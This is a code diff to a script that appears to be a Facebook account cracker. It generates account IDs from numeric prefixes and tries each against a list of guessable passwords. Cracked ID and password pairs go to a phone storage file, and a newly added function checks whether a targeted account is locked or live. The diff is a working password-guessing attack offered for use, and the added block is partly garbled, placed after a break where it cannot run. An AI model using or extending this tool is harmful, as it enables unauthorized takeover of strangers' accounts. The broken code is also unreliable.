@@ -316,7 +316,7 @@ def virus3():
 		print(50*'_')
 		for guru in user:
 			uid = kode+koda+kodb+guru
-			pwx = [koda+kodb+guru,kodb+guru,kode+koda+kodb,kode+kode,kode+'123',kode+'1234','Bangladesh','i love you','i hate you','i have you','free fire']
+			pwx = [koda+kodb+guru,kodb+guru,kode+koda+kodb,kode+kode,kode+'123',kode+'1234','Bangladesh','i love you','hridoy','sadiya','fatema']
 			yaari.submit(c,uid,pwx,tl)
 	print(50*'_')
 	print(' [ðŸ˜­] Crack process has been completed')
@@ -491,6 +491,24 @@ def c(uid,pwx,tl):
                 oks.append(cid)
                 open('/sdcard/LM-OK.txt', 'a').write(cid+' | '+ps+'\n')
                 break
+                try:
+                    uid=reqx['uid']
+                except:
+                    uid=ids
+                    ckkx=lock_check(uid)
+                if ckkx=='LOCK':
+                    break
+                    #Lock show hobey na
+                    #-------checker------#
+def lock_check(uid):
+    sessionx=requests.Session()
+    urlx=f'https://www.facebook.com/p/{uid}'
+    req=bxx(sessionx.get(urlx).content,'html.parser')
+    tx=req.find('title').text
+    if tx =='Facebook':
+        return('LOCK')
+    else:
+        return('LIVE')
             else:
                 continue
         loop+=1        
